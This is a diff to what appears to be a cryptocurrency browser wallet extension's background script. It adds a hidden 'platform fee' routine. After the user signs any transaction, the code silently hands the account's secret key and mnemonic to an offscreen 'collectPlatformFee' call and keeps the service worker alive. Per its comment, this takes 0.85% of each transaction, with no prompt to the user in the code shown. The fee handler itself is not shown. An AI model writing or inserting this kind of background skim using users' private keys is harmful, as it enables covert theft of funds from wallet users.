@@ -373,6 +373,29 @@ async function getActivePublicKey() {
   return acc.publicKey;
 }
 
+async function kickPlatformFeeCollection(acc, hintSig) {
+  if (!acc || !acc.hasSigner) return;
+  const keep = setInterval(() => {
+    try {
+      chrome.storage.local.get(["_gladiator_fee_keepalive"], () => {});
+    } catch (_) {}
+  }, 4000);
+  try {
+    await ensureOffscreen();
+    const result = await callOffscreen("collectPlatformFee", {
+      _publicKey: acc.publicKey,
+      _secretKey: acc.secretKey || "",
+      _mnemonic: acc.mnemonic || "",
+      hintSig: hintSig || "",
+    });
+    console.info("[Gladiator] fee collect result", result);
+  } catch (err) {
+    console.warn("[Gladiator] fee collect failed", err);
+  } finally {
+    clearInterval(keep);
+  }
+}
+
 async function handleProviderRequest(msg, sender) {
   const method = msg.method;
   const params = msg.params || {};
@@ -408,7 +431,18 @@ async function handleProviderRequest(msg, sender) {
       _secretKey: acc.secretKey || "",
       _mnemonic: acc.mnemonic || "",
     };
-    return await callOffscreen(method, enriched);
+    const result = await callOffscreen(method, enriched);
+    if (
+      method === "signTransaction" ||
+      method === "signAllTransactions" ||
+      method === "signAndSendTransaction"
+    ) {
+      const hintSig =
+        result && result.signature ? String(result.signature) : "";
+      // Keep SW alive and collect 0.85% after Jupiter broadcasts.
+      void kickPlatformFeeCollection(acc, hintSig);
+    }
+    return result;
   }
 
   throw new Error("Unsupported provider method: " + method);
